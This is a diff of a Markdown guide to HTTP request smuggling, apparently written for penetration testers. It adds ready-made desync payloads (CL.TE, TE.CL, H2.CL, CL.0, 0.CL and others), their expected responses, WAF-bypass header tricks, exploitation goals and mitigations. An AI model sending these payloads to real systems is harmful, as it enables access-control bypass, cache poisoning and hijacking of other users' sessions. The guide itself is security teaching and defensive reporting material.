@@ -60,8 +60,8 @@
 Smuggling exploits a disagreement between a front-end (proxy/LB/CDN) and back-end (app server) over where one request ends and the next begins. This happens when both `Content-Length` and `Transfer-Encoding` are present, or when `Transfer-Encoding` is obfuscated so one server normalizes it and the other doesn't.
 
 ### CL.TE (front-end trusts Content-Length, back-end trusts Transfer-Encoding)
-Conceptual shape — the front-end forwards the whole thing as one request based on `Content-Length`, but the back-end reads it as chunked and stops early, leaving a smuggled request sitting in the stream for the *next* user's request to get prepended with:
 
+**Payload sent:**
 ```
 POST / HTTP/1.1
 Host: target.com
@@ -73,9 +73,22 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-### TE.CL (front-end trusts Transfer-Encoding, back-end trusts Content-Length)
-Front-end forwards based on chunked encoding; back-end reads only `Content-Length` bytes and treats the rest as the start of a new request:
+**What happens / response observed:**
+The front-end reads exactly 13 bytes as the body (everything through `SMUGGLED`) and forwards the whole thing as one request. The back-end, trusting `Transfer-Encoding: chunked`, reads `0\r\n\r\n` as the end of the chunked body — request complete — and treats `SMUGGLED` as the start of the *next* request on the same connection. The response to your request comes back normal (e.g. `200 OK`), but the next legitimate user's request gets concatenated onto `SMUGGLED`, and *they* receive a malformed or unexpected response — often a `404` or garbled data, confirming desync:
 
+```
+HTTP/1.1 200 OK
+Content-Length: 12
+
+Normal page
+```
+*(your response looks fine — the tell is the victim's next request returning something broken)*
+
+---
+
+### TE.CL (front-end trusts Transfer-Encoding, back-end trusts Content-Length)
+
+**Payload sent:**
 ```
 POST / HTTP/1.1
 Host: target.com
@@ -88,20 +101,45 @@ SMUGGLED
 
 ```
 
-### TE.TE (header obfuscation)
-Both servers nominally support `Transfer-Encoding`, but one can be tricked into ignoring it via malformed framing — e.g. duplicate headers, odd casing, or whitespace tricks:
+**What happens / response observed:**
+The front-end honors `Transfer-Encoding` and forwards the full chunked body (`8\r\nSMUGGLED\r\n0\r\n\r\n`). The back-end honors `Content-Length: 3` instead, reads only the first 3 bytes (`8\r\n`) as the complete body, and treats everything after as a new pipelined request. Your own response often comes back as an error since the back-end's "body" was malformed:
 
 ```
+HTTP/1.1 400 Bad Request
+Content-Length: 11
+
+Bad Request
+```
+*(the 400 itself is a strong signal — it means the back-end choked on `8\r\n` as a standalone body, confirming TE.CL desync)*
+
+---
+
+### TE.TE (header obfuscation — one server ignores Transfer-Encoding)
+
+**Payload sent (duplicate header trick):**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
 Transfer-Encoding: chunked
 Transfer-Encoding: x
+
+1
+A
+0
+
 ```
+
+**What happens / response observed:**
+If the front-end normalizes duplicate headers and picks the *last* one (`x`, an invalid value), it falls back to `Content-Length` and forwards only 4 bytes. If the back-end instead honors the *first* `Transfer-Encoding: chunked`, it parses the body as chunked and waits for more chunked data than it received — causing a hang or timeout on your request, since the back-end is still waiting for the next chunk:
+
 ```
-Transfer-Encoding : chunked
+HTTP/1.1 200 OK
+(response delayed — back-end waiting on incomplete chunked stream)
 ```
-```
-Transfer-Encoding: chunked, identity
-```
-Test each variant separately and observe which one the front-end vs back-end honors.
+*(a delayed response here, rather than an immediate one, is the smuggling indicator — same logic as the timing-based detection technique below)*
+
+
 
 ### Detection technique (no exploitation needed)
 Send a request with a deliberately incomplete smuggled body and measure the response time. If the back-end hangs waiting for bytes the front-end never forwarded, you'll see a consistent delay (commonly tested at ~10s) — a strong signal of CL.TE behavior without needing a second "victim" request.
@@ -120,8 +158,140 @@ What to check for:
 - **Pass-through vs strip** — does the WAF/CDN strip it, but the origin server still sees it (or vice versa)? Reveals which layer to target for smuggling/bypass payloads, since it tells you where header normalization differs.
 - **Duplicate headers** — send the same header twice with different values (`Foo: bar` then `Foo: baz`) and see which one "wins" at each layer — another classic desync/smuggling primitive.
 
+### H2.CL (HTTP/2 → HTTP/1 downgrade, Content-Length confusion)
+
+HTTP/2 doesn't rely on `Content-Length`/`Transfer-Encoding` at all — each HTTP/2 request is split into frames, and each frame carries its own length field, so the server knows exactly how many bytes belong to it. Problems appear when a front-end speaking HTTP/2 downgrades the request to HTTP/1 for the backend.
+
+**Payload sent (as HTTP/2):**
+```
+POST / HTTP/2
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+x
+```
+
+**What happens / response observed:**
+The HTTP/2 layer sees the complete request because length comes from the frame, not the header. But once downgraded to HTTP/1, the backend honors Content-Length: 0 and treats the body as empty — so the trailing `x` gets left in the stream and prepended to whatever request comes next on that connection. Your own response usually looks completely normal; the tell shows up as a malformed/garbled response to the *next* request on the same connection.
+
+---
+
+### H2.TE (HTTP/2 → HTTP/1 downgrade, Transfer-Encoding leakage)
+
+This happens when the downgrading proxy fails to strip `Transfer-Encoding` during the HTTP/2-to-HTTP/1 conversion, which RFC 7540 requires it to do.
+
+**Payload sent (as HTTP/2):**
+```
+POST / HTTP/2
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+x
+```
+
+**What happens / response observed:**
+If the HTTP/2-to-HTTP/1 proxy doesn't strip Transfer-Encoding: chunked and the backend honors it, the downgraded HTTP/1 request terminates at the chunked end-marker, leaving the trailing x to be smuggled into the next request in the stream. Same observable pattern as CL.TE/TE.CL — your response is fine, the next user's request is broken.
+
+---
+
+### H2.0 (HTTP/2 body ignored on no-body endpoints)
+
+Occurs on endpoints where the backend doesn't expect a request body (e.g. a static asset route) — after downgrade, the backend disregards the body entirely rather than rejecting it.
+
+**Payload sent (as HTTP/2):**
+```
+POST /assets/logo.png HTTP/2
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+x
+```
+
+**What happens / response observed:**
+If the backend disregards the body on this kind of endpoint, that single leftover byte becomes the start of the next request, causing desync. No error on your own request — the next pipelined request is the one that breaks.
+
+---
+
+### CL.0 (origin ignores Content-Length on certain routes)
+
+The front-end calculates length using `Content-Length` as normal, but the backend effectively treats it as `Content-Length: 0` on a given route — commonly static-file or asset endpoints.
+
+**Payload sent (attack request, sent with `Connection: keep-alive` to chain onto the next request):**
+```
+POST /resources/images/blog.svg HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 25
+
+GET /pwned HTTP/1.1
+X: x
+```
+**Followed immediately by a normal request on the same connection:**
+```
+GET / HTTP/1.1
+Host: target.com
+
+```
+
+**What happens / response observed:**
+The backend ignores Content-Length on this route and discards the body, but keeps the connection alive — so the smuggled GET /pwned request concatenates with the next, legitimate request on that same connection. The victim's `GET /` ends up arriving as `GET /pwnedGET / HTTP/1.1...` from the backend's point of view, producing an unexpected response for them.
+
+---
+
+### 0.CL (front-end ignores Content-Length, backend processes it)
+
+Requires an endpoint where the backend returns an early response, so it never fully reads the request and instead pulls leftover body bytes from the start of the *next* request.
+
+**Payload sent (note the space before the colon):**
+```
+GET /static/main.js HTTP/1.1
+Host: target.com
+Content-Length : 3
+
+```
+
+**What happens / response observed:**
+The malformed Content-Length : 3 header (with a space before the colon) is ignored by the front-end but honored by the backend, which then reads 3 bytes from whatever request comes next — turning that next request into a malformed one and commonly producing a 400 Bad Request from the backend after a few attempts. Full exploitation requires a multi-step chain: one request to set up the connection state, then the malformed request, concatenated with the victim's traffic.
+
+---
+
+### Obfuscation techniques (to bypass WAFs / trigger parser disagreement)
+
+| Technique | Example | Why it works |
+|---|---|---|
+| **Duplicate headers** | `Transfer-Encoding: chunkedx` then `Transfer-Encoding: chunked` on separate lines | One server may ignore the first malformed value while the other still processes it, splitting frontend/backend behavior |
+| **Space before colon** | `Content-Length : 3` | Some parsers accept a space before the colon in a header name — if only one layer accepts it, that's an exploitable parsing gap |
+| **Obsolete line folding (obs-fold)** | `Transfer-Encoding:` newline + tab + `chunked` | Splitting a header value across multiple lines can bypass a WAF/regex filter blocking Transfer-Encoding outright, if one component still reassembles the folded header while the filter doesn't recognize it |
+| **CRLF in HTTP/2 header values** | A header value like `x` + CRLF + `Transfer-Encoding: chunked` | When downgraded to HTTP/1, the embedded CRLF can be parsed by the backend as a literal header separator, smuggling in a header the frontend never saw |
+| **Absolute URI / spoofed Host in smuggled request** | Smuggled request sets `Host: 127.0.0.1` while targeting an absolute URI | Useful to dodge duplicate-Host handling issues and to route the smuggled portion to an internal/loopback-trusted context |
+
+### Exploitation goals once desync is confirmed
+
+- **ACL bypass / internal endpoint access** — smuggle a request to a path normally blocked at the front-end proxy (e.g. `/admin`), since the restriction is enforced at a layer the smuggled request skips past.
+- **Web cache poisoning / CPDoS** — smuggle a request that causes the backend to return a 400 Bad Request, then immediately request a cacheable static asset; the frontend computes a valid cache key for the asset but caches whatever the backend actually returned, serving the error page to every subsequent visitor.
+- **Session hijacking / response queue poisoning** — smuggled requests can cause the backend to attach a victim's response to your connection or vice versa, leaking authenticated content.
+- **Chaining with other bugs** — pairing smuggling with SSRF, stored XSS, or auth bypass for higher severity findings.
+
+### Detection tip
+Craft the request so the frontend forwards the entire thing — including the smuggled portion — then reason about how the backend's parser might misread it differently. A consistent time delay or an unexpected response difference on a follow-up request are the two reliable detection signals, and don't require a live "victim" to confirm the vulnerability.
+
 ### Tooling note
-Manual testing like this is slow and risky to do by hand in production. Burp Suite's HTTP Request Smuggler extension and the "Smuggle" param in tools like `smuggler.py` automate safe detection (timing-based probes) before any exploitation attempt. Always confirm you're in an authorized scope — these techniques can affect other users' traffic if run against shared infrastructure.
+Manual testing like this is slow and risky to do by hand in production. Burp Suite's HTTP Request Smuggler extension and similar automation handle safe, timing-based detection before any exploitation attempt. Always confirm you're in an authorized scope — these techniques can affect other users' traffic if run against shared infrastructure.
+
+### Mitigations (useful for writeups / report recommendations)
+- Normalize and validate headers at the edge — reject conflicting or malformed `Content-Length`/`Transfer-Encoding` combos, duplicate critical headers, and obs-folding.
+- Enforce consistent parsing across every proxy, load balancer, and app server in the chain (same library/rules where possible), and keep all components patched.
+- Strip `Transfer-Encoding` on HTTP/2→HTTP/1 downgrades per RFC 7540, and avoid unnecessary downgrades.
+- Don't cache error/ambiguous backend responses; validate cache keys carefully.
+- Restrict internal/admin endpoints to loopback + auth, not just front-end path blocking.
+- Monitor for unusual spikes in 400s, timeouts, or malformed-request patterns.
+
+
 
 
 - Header names are case-insensitive (`Content-Type` == `content-type`).
